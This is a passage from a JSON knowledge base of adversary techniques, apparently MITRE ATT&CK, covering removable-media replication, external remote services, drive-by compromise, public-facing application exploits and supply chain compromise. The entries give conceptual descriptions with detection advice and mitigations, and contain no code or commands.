be able to Steal Application Access Tokens to move laterally across the cloud environment. <a href=\"https://posts.specterops.io/managed-identity-attack-paths-part-1-automation-accounts-82667d17187a?gi=6a9daedade1c\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SpecterOps Managed Identity 2022)</a>","detection":"Monitor the activity of cloud accounts to detect abnormal or malicious behavior, such as accessing information outside of the normal function of the account or account usage at atypical hours.","platforms":["IaaS","Identity Provider","Office Suite","SaaS"],"dataSources":["User Account: User Account Authentication","Logon Session: Logon Session Metadata","Logon Session: Logon Session Creation"],"mitigations":[{"id":"M1015","name":"Active Directory Configuration","description":"Disable legacy authentication, which does not support MFA, and require the use of modern authentication protocols instead."},{"id":"M1017","name":"User Training","description":"Applications may send push notifications to verify a login as a form of multi-factor authentication (MFA). Train users to only accept valid push notifications and to report suspicious push notifications."},{"id":"M1018","name":"User Account Management","description":"Periodically review user accounts and remove those that are inactive or unnecessary. Limit the ability for user accounts to create additional accounts."},{"id":"M1026","name":"Privileged Account Management","description":"Review privileged cloud account permission levels routinely to look for those that could allow an adversary to gain wide access, such as Global Administrator and Privileged Role Administrator in Azure AD. <a href=\"https://technet.microsoft.com/en-us/library/dn535501.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Credential Theft)</a> <a href=\"https://technet.microsoft.com/en-us/library/dn487450.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Least Privilege)</a> <a href=\"https://learn.microsoft.com/en-us/security/benchmark/azure/baselines/aad-security-baseline\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Azure security baseline for Azure Active Directory)</a> These reviews should also check if new privileged cloud accounts have been created that were not authorized. For example, in Azure AD environments configure alerts to notify when accounts have gone many days without using privileged roles, as these roles may be able to be removed. <a href=\"https://learn.microsoft.com/en-us/security/benchmark/azure/baselines/aad-security-baseline\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Security Alerts for Azure AD Roles)</a> Consider using temporary, just-in-time (JIT) privileged access to Azure AD resources rather than permanently assigning privileged roles. <a href=\"https://learn.microsoft.com/en-us/security/benchmark/azure/baselines/aad-security-baseline\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Azure security baseline for Azure Active Directory)</a>"},{"id":"M1027","name":"Password Policies","description":"Ensure that cloud accounts, particularly privileged accounts, have complex, unique passwords across all systems on the network. Passwords and access keys should be rotated regularly. This limits the amount of time credentials can be used to access resources if a credential is compromised without your knowledge. Cloud service providers may track access key age to help audit and identify keys that may need to be rotated. <a href=\"https://aws.amazon.com/blogs/security/newly-updated-features-in-the-aws-iam-console-help-you-adhere-to-iam-best-practices/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AWS - IAM Console Best Practices)</a>"},{"id":"M1032","name":"Multi-factor Authentication","description":"Use multi-factor authentication for cloud accounts, especially privileged accounts. This can be implemented in a variety of forms (e.g. hardware, virtual, SMS), and can also be audited using administrative reporting features. <a href=\"https://aws.amazon.com/blogs/security/newly-updated-features-in-the-aws-iam-console-help-you-adhere-to-iam-best-practices/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AWS - IAM Console Best Practices)</a>"},{"id":"M1036","name":"Account Use Policies","description":"Use conditional access policies to block logins from non-compliant devices or from outside defined organization IP ranges. <a href=\"https://learn.microsoft.com/en-us/azure/active-directory/conditional-access/concept-conditional-access-policy-common\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Common Conditional Access Policies)</a>"}]}]},{"id":"T1091","name":"Replication Through Removable Media","description":"Adversaries may move onto systems, possibly those on disconnected or air-gapped networks, by copying malware to removable media and taking advantage of Autorun features when the media is inserted into a system and executes. In the case of Lateral Movement, this may occur through modification of executable files stored on removable media or by copying malware and renaming it to look like a legitimate file to trick users into executing it on a separate system. In the case of Initial Access, this may occur through manual manipulation of the media, modification of systems used to initially format the media, or modification to the media's firmware itself.\n\nMobile devices may also be used to infect PCs with malware if connected via USB. (Citation: Exploiting Smartphone USB ) This infection may be achieved using devices (Android, iOS, etc.) and, in some instances, USB charging cables. <a href=\"https://www.computerworld.com/article/2486903/windows-malware-tries-to-infect-android-devices-connected-to-pcs.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Windows Malware Infecting Android)</a> <a href=\"https://techcrunch.com/2019/08/12/iphone-charging-cable-hack-computer-def-con/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: iPhone Charging Cable Hack)</a> For example, when a smartphone is connected to a system, it may appear to be mounted similar to a USB-connected disk drive. If malware that is compatible with the connected system is on the mobile device, the malware could infect the machine (especially if Autorun features are enabled).","detection":"Monitor file access on removable media. Detect processes that execute from removable media after it is mounted or when initiated by a user. If a remote access tool is used in this manner to move laterally, then additional actions are likely to occur after execution, such as opening network connections for Command and Control and system and network information Discovery.","platforms":["Windows"],"dataSources":["File: File Access","Process: Process Creation","Drive: Drive Creation","File: File Creation"],"mitigations":[{"id":"M1034","name":"Limit Hardware Installation","description":"Limit the use of USB devices and removable media within a network."},{"id":"M1040","name":"Behavior Prevention on Endpoint","description":"On Windows 10, enable Attack Surface Reduction (ASR) rules to block unsigned/untrusted executable files (such as .exe, .dll, or .scr) from running from USB removable drives. <a href=\"https://docs.microsoft.com/microsoft-365/security/defender-endpoint/attack-surface-reduction\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: win10_asr)</a>"},{"id":"M1042","name":"Disable or Remove Feature or Program","description":"Disable Autorun if it is unnecessary. <a href=\"https://support.microsoft.com/en-us/kb/967715\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Disable Autorun)</a> Disallow or restrict removable media at an organizational policy level if it is not required for business operations. <a href=\"https://technet.microsoft.com/en-us/library/cc772540(v=ws.10).aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Removable Media Control)</a>"}],"subTechniques":[]},{"id":"T1133","name":"External Remote Services","description":"Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as Windows Remote Management and VNC can also be used externally. <a href=\"https://support.apple.com/guide/remote-desktop/set-up-a-computer-running-vnc-software-apdbed09830/mac\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: MacOS VNC software for Remote Desktop)</a>\n\nAccess to Valid Accounts to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network. <a href=\"https://www.volexity.com/blog/2015/10/07/virtual-private-keylogging-cisco-web-vpns-leveraged-for-access-and-persistence/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Volexity Virtual Private Keylogging)</a> Access to remote services may be used as a redundant or persistent access mechanism during an operation.\n\nAccess may also be gained through an exposed service that doesn’t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard. <a href=\"https://www.trendmicro.com/en_us/research/20/f/xorddos-kaiji-botnet-malware-variants-target-exposed-docker-servers.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Trend Micro Exposed Docker Server)</a> <a href=\"https://unit42.paloaltonetworks.com/hildegard-malware-teamtnt/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Unit 42 Hildegard Malware)</a>\n\nAdversaries may also establish persistence on network by configuring a Tor hidden service on a compromised system. Adversaries may utilize the tool <code>ShadowLink</code> to facilitate the installation and configuration of the Tor hidden service. Tor hidden service is then accessible via the Tor network because <code>ShadowLink</code> sets up a .onion address on the compromised system. <code>ShadowLink</code> may be used to forward any inbound connections to RDP, allowing the adversaries to have remote access. <a href=\"https://www.microsoft.com/en-us/security/blog/2025/02/12/the-badpilot-campaign-seashell-blizzard-subgroup-conducts-multiyear-global-access-operation/?ref=thestack.technology\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: The BadPilot campaign)</a> Adversaries may get <code>ShadowLink</code> to persist on a system by masquerading it as an MS Defender application. <a href=\"https://www.microsoft.com/en-us/security/security-insider/intelligence-reports/russian-threat-actors-dig-in-prepare-to-seize-on-war-fatigue\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Russian threat actors dig in, prepare to seize on war fatigue)</a>","detection":"Follow best practices for detecting adversary use of Valid Accounts for authenticating to remote services. Collect authentication logs and analyze for unusual access patterns, windows of activity, and access outside of normal business hours.\n\nWhen authentication is not required to access an exposed remote service, monitor for follow-on activities such as anomalous external use of the exposed API or application.","platforms":["Containers","Linux","macOS","Windows"],"dataSources":["Network Traffic: Network Connection Creation","Network Traffic: Network Traffic Flow","Logon Session: Logon Session Metadata","Application Log: Application Log Content","Network Traffic: Network Traffic Content"],"mitigations":[{"id":"M1021","name":"Restrict Web-Based Content","description":"Restrict all traffic to and from public Tor nodes. <a href=\"https://www.cisa.gov/sites/default/files/publications/AA20-183A_Defending_Against_Malicious_Cyber_Activity_Originating_from_Tor_S508C.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Defending Against Malicious Cyber Activity Originating from Tor)</a>"},{"id":"M1030","name":"Network Segmentation","description":"Deny direct remote access to internal systems through the use of network proxies, gateways, and firewalls."},{"id":"M1032","name":"Multi-factor Authentication","description":"Use strong two-factor or multi-factor authentication for remote service accounts to mitigate an adversary's ability to leverage stolen credentials, but be aware of Multi-Factor Authentication Interception techniques for some two-factor authentication implementations."},{"id":"M1035","name":"Limit Access to Resource Over Network","description":"Limit access to remote services through centrally managed concentrators such as VPNs and other managed remote access systems."},{"id":"M1042","name":"Disable or Remove Feature or Program","description":"Disable or block remotely available services that may be unnecessary."}],"subTechniques":[]},{"id":"T1189","name":"Drive-by Compromise","description":"Adversaries may gain access to a system through a user visiting a website over the normal course of browsing. Multiple ways of delivering exploit code to a browser exist (i.e., Drive-by Target), including:\n\n* A legitimate website is compromised, allowing adversaries to inject malicious code\n* Script files served to a legitimate website from a publicly writeable cloud storage bucket are modified by an adversary\n* Malicious ads are paid for and served through legitimate ad providers (i.e., Malvertising)\n* Built-in web application interfaces that allow user-controllable content are leveraged for the insertion of malicious scripts or iFrames (e.g., cross-site scripting)\n\nBrowser push notifications may also be abused by adversaries and leveraged for malicious code injection via User Execution. By clicking \"allow\" on browser push notifications, users may be granting a website permission to run JavaScript code on their browser. <a href=\"https://viruspositive.com/resources/blogs/the-dark-side-of-web-push-notifications\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Push notifications - viruspositive)</a> <a href=\"https://www.mcafee.com/blogs/other-blogs/mcafee-labs/scammers-impersonating-windows-defender-to-push-malicious-windows-apps/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: push notification -mcafee)</a> <a href=\"https://www.malwarebytes.com/blog/news/2019/01/browser-push-notifications-feature-asking-abused\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: push notifications - malwarebytes)</a>\n\nOften the website used by an adversary is one visited by a specific community, such as government, a particular industry, or a particular region, where the goal is to compromise a specific user or set of users based on a shared interest. This kind of targeted campaign is often referred to a strategic web compromise or watering hole attack. There are several known examples of this occurring. <a href=\"http://blog.shadowserver.org/2012/05/15/cyber-espionage-strategic-web-compromises-trusted-websites-serving-dangerous-results/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Shadowserver Strategic Web Compromise)</a>\n\nTypical drive-by compromise process:\n\n1. A user visits a website that is used to host the adversary controlled content.\n2. Scripts automatically execute, typically searching versions of the browser and plugins for a potentially vulnerable version. The user may be required to assist in this process by enabling scripting, notifications, or active website components and ignoring warning dialog boxes.\n3. Upon finding a vulnerable version, exploit code is delivered to the browser.\n4. If exploitation is successful, the adversary will gain code execution on the user's system unless other protections are in place. In some cases, a second visit to the website after the initial scan is required before exploit code is delivered.\n\nUnlike Exploit Public-Facing Application, the focus of this technique is to exploit software on a client endpoint upon visiting a website. This will commonly give an adversary access to systems on the internal network instead of external systems that may be in a DMZ.","detection":"Firewalls and proxies can inspect URLs for potentially known-bad domains or parameters. They can also do reputation-based analytics on websites and their requested resources such as how old a domain is, who it's registered to, if it's on a known bad list, or how many other users have connected to it before.\n\nNetwork intrusion detection systems, sometimes with SSL/TLS inspection, can be used to look for known malicious scripts (recon, heap spray, and browser identification scripts have been frequently reused), common script obfuscation, and exploit code.\n\nDetecting compromise based on the drive-by exploit from a legitimate website may be difficult. Also look for behavior on the endpoint system that might indicate successful compromise, such as abnormal behavior of browser processes. This could include suspicious files written to disk, evidence of Process Injection for attempts to hide execution, evidence of Discovery, or other unusual network traffic that may indicate additional tools transferred to the system.","platforms":["Identity Provider","Linux","macOS","Windows"],"dataSources":["Application Log: Application Log Content","Network Traffic: Network Traffic Content","Process: Process Creation","File: File Creation","Network Traffic: Network Connection Creation"],"mitigations":[{"id":"M1017","name":"User Training","description":"Train users to be aware of access or manipulation attempts by an adversary to reduce the risk of successful spearphishing, social engineering, and other techniques that involve user interaction."},{"id":"M1021","name":"Restrict Web-Based Content","description":"Adblockers can help prevent malicious code served through ads from executing in the first place. Script blocking extensions can also help to prevent the execution of JavaScript. \n\nConsider disabling browser push notifications from certain applications and browsers. <a href=\"https://macsecurity.net/view/543-remove-guroshied-mac\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: mac security virus popup)</a> <a href=\"https://www.infosecinstitute.com/resources/security-awareness/malicious-push-notifications-is-that-a-real-or-fake-windows-defender-update/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: push notifications -infosecinstitute)</a> <a href=\"https://krebsonsecurity.com/2020/11/be-very-sparing-in-allowing-site-notifications/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: site notifications - krebsonsecurity)</a>"},{"id":"M1048","name":"Application Isolation and Sandboxing","description":"Browser sandboxes can be used to mitigate some of the impact of exploitation, but sandbox escapes may still exist. <a href=\"https://blogs.windows.com/msedgedev/2017/03/23/strengthening-microsoft-edge-sandbox/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Windows Blogs Microsoft Edge Sandbox)</a> <a href=\"https://arstechnica.com/information-technology/2017/03/hack-that-escapes-vm-by-exploiting-edge-browser-fetches-105000-at-pwn2own/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Ars Technica Pwn2Own 2017 VM Escape)</a>\n\nOther types of virtualization and application microsegmentation may also mitigate the impact of client-side exploitation. The risks of additional exploits and weaknesses in implementation may still exist for these types of systems. <a href=\"https://arstechnica.com/information-technology/2017/03/hack-that-escapes-vm-by-exploiting-edge-browser-fetches-105000-at-pwn2own/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Ars Technica Pwn2Own 2017 VM Escape)</a>"},{"id":"M1050","name":"Exploit Protection","description":"Security applications that look for behavior used during exploitation such as Windows Defender Exploit Guard (WDEG) and the Enhanced Mitigation Experience Toolkit (EMET) can be used to mitigate some exploitation behavior. <a href=\"https://blogs.technet.microsoft.com/srd/2017/08/09/moving-beyond-emet-ii-windows-defender-exploit-guard/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Moving Beyond EMET)</a> Control flow integrity checking is another way to potentially identify and stop a software exploit from occurring. <a href=\"https://en.wikipedia.org/wiki/Control-flow_integrity\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Wikipedia Control Flow Integrity)</a> Many of these protections depend on the architecture and target application binary for compatibility."},{"id":"M1051","name":"Update Software","description":"Ensuring that all browsers and plugins are kept updated can help prevent the exploit phase of this technique. Use modern browsers with security features turned on. <a href=\"https://www.proofpoint.com/us/blog/threat-insight/are-you-sure-your-browser-date-current-landscape-fake-browser-updates\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Browser-updates)</a>"}],"subTechniques":[]},{"id":"T1190","name":"Exploit Public-Facing Application","description":"Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.\n\nExploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet-accessible open sockets. <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2016-6662\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: NVD CVE-2016-6662)</a> <a href=\"https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-microsoft-windows-smb-server-could-allow-for-remote-code-execution/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CIS Multiple SMB Vulnerabilities)</a> <a href=\"https://us-cert.cisa.gov/ncas/alerts/TA18-106A\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)</a> <a href=\"https://community.cisco.com/t5/security-blogs/attackers-continue-to-target-legacy-devices/ba-p/4169954\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco Blog Legacy Device Attacks)</a> <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2014-7169\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: NVD CVE-2014-7169)</a> On ESXi infrastructure, adversaries may exploit exposed OpenSLP services; they may alternatively exploit exposed VMware vCenter servers. <a href=\"https://www.recordedfuture.com/blog/esxiargs-ransomware-targets-vmware-esxi-openslp-servers\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Recorded Future ESXiArgs Ransomware 2023)</a> <a href=\"https://arstechnica.com/information-technology/2021/02/armed-with-exploits-hackers-on-the-prowl-for-a-critical-vmware-vulnerability/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Ars Technica VMWare Code Execution Vulnerability 2021)</a> Depending on the flaw being exploited, this may also involve Exploitation for Stealth or Exploitation for Client Execution.\n\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs (e.g., via the Cloud Instance Metadata API), exploit container host access via Escape to Host, or take advantage of weak identity and access management policies.\n\nAdversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses. <a href=\"https://www.mandiant.com/resources/blog/fortinet-malware-ecosystem\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Mandiant Fortinet Zero Day)</a> <a href=\"https://www.wired.com/story/russia-ukraine-cyberattacks-mandiant/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Wired Russia Cyberwar)</a>\n\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities. <a href=\"https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: OWASP Top 10)</a> <a href=\"https://cwe.mitre.org/top25/index.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CWE top 25)</a>","detection":"Monitor application logs for abnormal behavior that may indicate attempted or successful exploitation. Use deep packet inspection to look for artifacts of common exploit traffic, such as SQL injection. Web Application Firewalls may detect improper inputs attempting exploitation.","platforms":["Containers","ESXi","IaaS","Linux","macOS","Network Devices","Windows"],"dataSources":["Network Traffic: Network Traffic Content","Application Log: Application Log Content"],"mitigations":[{"id":"M1016","name":"Vulnerability Scanning","description":"Regularly scan externally facing systems for vulnerabilities and establish procedures to rapidly patch systems when critical vulnerabilities are discovered through scanning and through public disclosure. <a href=\"https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: OWASP Top 10)</a>"},{"id":"M1026","name":"Privileged Account Management","description":"Use least privilege for service accounts will limit what permissions the exploited process gets on the rest of the system."},{"id":"M1030","name":"Network Segmentation","description":"Segment externally facing servers and services from the rest of the network with a DMZ or on separate hosting infrastructure."},{"id":"M1035","name":"Limit Access to Resource Over Network","description":"Ensure that all publicly exposed services are actually intended to be so, and restrict access to any that should only be available internally."},{"id":"M1037","name":"Filter Network Traffic","description":"Restrict outbound network traffic from public-facing servers to prevent unauthorized connections from initiating communications with attacker-controlled infrastructure. While this may not prevent the initial exploitation, it limits the attacker's ability to verify and control the compromised server post-exploit, reducing the overall impact of the attack."},{"id":"M1048","name":"Application Isolation and Sandboxing","description":"Application isolation will limit what other processes and system features the exploited target can access."},{"id":"M1050","name":"Exploit Protection","description":"Web Application Firewalls may be used to limit exposure of applications to prevent exploit traffic from reaching the application."},{"id":"M1051","name":"Update Software","description":"Update software regularly by employing patch management for externally exposed applications."}],"subTechniques":[]},{"id":"T1195","name":"Supply Chain Compromise","description":"Adversaries may manipulate products or product delivery mechanisms prior to receipt by a final consumer for the purpose of data or system compromise.\n\nSupply chain compromise can take place at any stage of the supply chain including:\n\n* Manipulation of development tools\n* Manipulation of a development environment\n* Manipulation of source code repositories (public or private)\n* Manipulation of source code in open-source dependencies\n* Manipulation of software update/distribution mechanisms\n* Compromised/infected system images (removable media infected at the factory) <a href=\"https://www-01.ibm.com/support/docview.wss?uid=ssg1S1010146&myns=s028&mynp=OCSTHGUJ&mynp=OCSTLM5A&mynp=OCSTLM6B&mynp=OCHW206&mync=E&cm_sp=s028-_-OCSTHGUJ-OCSTLM5A-OCSTLM6B-OCHW206-_-E\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: IBM Storwize)</a> <a href=\"https://www.se.com/us/en/download/document/SESN-2018-236-01/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Schneider Electric USB Malware)</a> \n* Replacement of legitimate software with modified versions\n* Sales of modified/counterfeit products to legitimate distributors\n* Shipment interdiction\n\nWhile supply chain compromise can impact any component of hardware or software, adversaries looking to gain execution have often focused on malicious additions to legitimate software in software distribution or update channels. <a href=\"https://blog.avast.com/new-investigations-in-ccleaner-incident-point-to-a-possible-third-stage-that-had-keylogger-capacities\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Avast CCleaner3 2018)</a> <a href=\"https://cloudblogs.microsoft.com/microsoftsecure/2018/03/07/behavior-monitoring-combined-with-machine-learning-spoils-a-massive-dofoil-coin-mining-campaign/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Dofoil 2018)</a> <a href=\"https://www.commandfive.com/papers/C5_APT_SKHack.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Command Five SK 2011)</a> Adversaries may limit targeting to a desired victim set or distribute malicious software to a broad set of consumers but only follow up with specific victims. <a href=\"https://web.archive.org/web/20190717233006/http://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/the-elderwood-project.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Symantec Elderwood Sept 2012)</a> <a href=\"https://blog.avast.com/new-investigations-in-ccleaner-incident-point-to-a-possible-third-stage-that-had-keylogger-capacities\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Avast CCleaner3 2018)</a> <a href=\"https://www.commandfive.com/papers/C5_APT_SKHack.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Command Five SK 2011)</a> Popular open-source projects that are used as dependencies in many applications may also be targeted as a means to add malicious code to users of the dependency. <a href=\"https://www.trendmicro.com/vinfo/dk/security/news/cybercrime-and-digital-threats/hacker-infects-node-js-package-to-steal-from-bitcoin-wallets\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Trendmicro NPM Compromise)</a>\n\nIn some cases, adversaries may conduct “second-order” supply chain compromises by leveraging the access gained from an initial supply chain compromise to further compromise a software component. <a href=\"https://krebsonsecurity.com/2023/04/3cx-breach-was-a-double-supply-chain-compromise/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Krebs 3cx overview 2023)</a> This may allow the threat actor to spread to even more victims.","detection":"Use verification of distributed binaries through hash checking or other integrity checking mechanisms. Scan downloads for malicious signatures and attempt to test software and updates prior to deployment while taking note of potential suspicious activity. Perform physical inspection of hardware to look for potential tampering.","platforms":["Linux","Windows","macOS","SaaS"],"dataSources":["Sensor Health: Host Status","File: File Metadata"],"mitigations":[{"id":"M1013","name":"Application Developer Guidance","description":"Application developers should be cautious when selecting third-party libraries to integrate into their application. Additionally, where possible, developers should lock software dependencies to specific versions rather than pulling the latest version on build. <a href=\"https://www.cidersecurity.io/top-10-cicd-security-risks/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cider Security Top 10 CICD Security Risks)</a>"},{"id":"M1016","name":"Vulnerability Scanning","description":"Continuous monitoring of vulnerability sources and the use of automatic and manual code review tools should also be implemented as well. <a href=\"https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: OWASP Top 10)</a>"},{"id":"M1018","name":"User Account Management","description":"Implement robust user account management practices to limit permissions associated with software execution. Ensure that software runs with the lowest necessary privileges, avoiding the use of root or administrator accounts when possible. By restricting permissions, you can minimize the risk of propagation and unauthorized actions in the event of a supply chain compromise, reducing the attack surface for adversaries to exploit within compromised systems."},{"id":"M1033","name":"Limit Software Installation","description":"Where possible, consider requiring developers to pull from internal repositories containing verified and approved packages rather than from external ones. <a href=\"https://www.cidersecurity.io/top-10-cicd-security-risks/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cider Security Top 10 CICD Security Risks)</a>"},{"id":"M1046","name":"Boot Integrity","description":"Use secure methods to boot a system and verify the integrity of the operating system and loading mechanisms."},{"id":"M1051","name":"Update Software","description":"A patch management process should be implemented to check unused dependencies, unmaintained and/or previously vulnerable dependencies, unnecessary features, components, files, and documentation."}],"subTechniques":[{"id":"T1195.001","name":"Compromise Software Dependencies and Development Tools","description":"Adversaries may manipulate software dependencies and development tools prior to receipt by a final consumer for the purpose of data or system compromise. Applications often depend on external software to function properly. Popular open source projects that are used as dependencies in many applications, such as pip and NPM packages, may be targeted as a means to add malicious code to users of the dependency. <a href=\"https://www.trendmicro.com/vinfo/dk/security/news/cybercrime-and-digital-threats/hacker-infects-node-js-package-to-steal-from-bitcoin-wallets\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Trendmicro NPM Compromise)</a> <a href=\"https://www.bitdefender.com/en-gb/blog/hotforsecurity/popular-npm-repositories-compromised-in-man-in-the-middle-attack\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Bitdefender NPM Repositories Compromised 2021)</a> <a href=\"https://cyberpress.org/malicious-npm-and-pypi-packages-disguised-as-dev-tools\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: MANDVI Malicious npm and PyPI Packages Disguised)</a> This may also include abandoned packages, which in some cases could be re-registered by threat actors after being removed by adversaries. <a href=\"https://thehackernews.com/2024/09/hackers-hijack-22000-removed-pypi.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: The Hacker News PyPi Revival Hijack 2024)</a> Adversaries may also employ \"typosquatting\" or name-confusion by choosing names similar to existing popular libraries or packages in order to deceive a user. <a href=\"https://hackread.com/backdoors-python-npm-packages-windows-linux/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Ahmed Backdoors in Python and NPM Packages)</a> <a href=\"https://checkmarx.com/zero-post/python-pypi-supply-chain-attack-colorama/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Meyer PyPI Supply Chain Attack Uncovered)</a> <a href=\"https://checkmarx.com/blog/new-technique-to-trick-developers-detected-in-an-open-source-supply-chain-attack/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Checkmarx-oss-seo)</a>\n\nAdditionally, CI/CD pipeline components, such as GitHub Actions, may be targeted in order to gain access to the building, testing, and deployment cycles of an application. <a href=\"https://unit42.paloaltonetworks.com/github-actions-supply-chain-attack\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Unit 42 Palo Alto GitHub Actions Supply Chain Attack 2025)</a> By adding malicious code into a GitHub action, a threat actor may be able to collect runtime credentials (e.g., via Proc Filesystem) or insert further malicious components into the build pipelines for a second-order supply chain compromise. <a href=\"https://owasp.org/www-project-top-10-ci-cd-security-risks/CICD-SEC-04-Poisoned-Pipeline-Execution\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: OWASP CICD-SEC-4)</a> As GitHub Actions are often dependent on other GitHub Actions, threat actors may be able to infect a large number of repositories via the compromise of a single Action. <a href=\"https://www.paloaltonetworks.com/blog/cloud-security/github-actions-worm-dependencies/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Palo Alto Networks GitHub Actions Worm 2023)</a>\n\nTargeting may be specific to a desired victim set or may be distributed to a broad set of consumers but only move on to additional tactics on specific victims.","detection":"Use verification of distributed binaries through hash checking or other integrity checking mechanisms. Scan downloads for malicious signatures and attempt to test software and updates prior to deployment while taking note of potential suspicious activity.","platforms":["Linux","macOS","Windows"],"dataSources":["File: File Metadata"],"mitigations":[{"id":"M1013","name":"Application Developer Guidance","description":"Application developers should be cautious when selecting third-party libraries to integrate into their application. Additionally, where possible, developers should lock software dependencies to specific versions rather than pulling the latest version on build. <a href=\"https://www.cidersecurity.io/top-10-cicd-security-risks/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cider Security Top 10 CICD Security Risks)</a> GitHub Actions may be pinned to a specific commit hash rather than a tag or branch. <a href=\"https://unit42.paloaltonetworks.com/github-actions-supply-chain-attack\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Unit 42 Palo Alto GitHub Actions Supply Chain Attack 2025)</a>"},{"id":"M1016","name":"Vulnerability Scanning","description":"Continuous monitoring of vulnerability sources and the use of automatic and manual code review tools should also be implemented as well. <a href=\"https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project\" target=\"_blank\" rel=\"noopener\" 